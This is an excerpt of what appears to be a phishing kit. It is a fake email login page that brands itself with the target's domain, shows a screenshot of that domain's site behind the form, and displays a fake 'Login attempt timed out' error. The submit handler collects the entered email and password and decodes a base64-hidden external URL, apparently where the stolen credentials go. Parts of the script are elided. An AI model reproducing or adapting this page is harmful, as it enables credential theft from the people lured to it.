 ...
 <body>
  ...
  <div id="login_form" action="" method="post" autocomplete="off"> 
   ...
   <div class="container" id="container" style="padding-bottom:10px!important; position: relative;"> 
    <div style="position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7; display:none" id="background-image"> 
    </div> 
    <img src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif" style="width:50px; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); display:none" id="processing"> 
   </div> 
  </div> 
  <script type="text/template" id="tpl-password">
    ...
    <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
        <div class="body">
            ...
            <div class="xlogo">
                <img id="logoimg" src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/favicons.png?alt=media&token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3">
                <span style="text-transform: capitalize;" class='text-g' id="banNer"></span>
                </div>
            <div class="row">
                <div class="col1"><label for="id_email">Email:</label></div>
                <div class="col2"><input type="text" name="email" value="" id="email" placeholder="Enter Email"></div>
            </div>
                <div class="col1"><label for="id_pass">Password:</label></div>
                <div class="col2"><input type="password" name="password" id="password" autofocus placeholder="Enter Password"></div>
            ...
            <br><br>
            <div class="row">
               <span id="msg" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top: 12px;
       ">Login attempt timed out. Please try again.</span>
	   
	   <span id="error" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top: 12px;
       ">Enter Password</span>
            </div>
            <div class="row">
                <div class="col1" style="line-height:40px;padding-top:10px;">
                    <input type="button" id='submit-btn' class="submit" value="Login to continue" style="padding:7px 24px;" /></div>
            </div>
            <div class="row">
                
                <p>
                    All Rights Reserved. Copyright © 2024 <span id="kai" style="text-transform: capitalize;"></span>
                    <br>
                    <br>
                </p>
            </div>
  ...
  <div id="root"> <iframe id="myframe" scrolling="no" style="position:absolute; top:0; width:100%; height:100%; left:0; background:#fff; opacity:0.7; frameborder:0"></iframe> 
  </div>  
  ...
  $(document).ready(function () {
    ...
    if (!email) {
      ...
      $("#processing").hide()
		...
		var image = "url('https://image.thum.io/get/maxAge/12/width/1200/http://"+sv;"')"
		...
		$(".logoname").html(final);
		$('#kai').html(""+my_slice);
		$('#banNer').html(""+my_slice);
		$('#banNer').html(final);
		$('#bg_screen').html(image);
    ...
    $('#submit-btn').click(function (event) {
      ...
      setTimeout(function () {
        ...
        if (!email) {
          ...
          var dm = atob("aHR0cHM6Ly9vaXJ0LnVzL3R1aS9nZXJsLnBocA==");
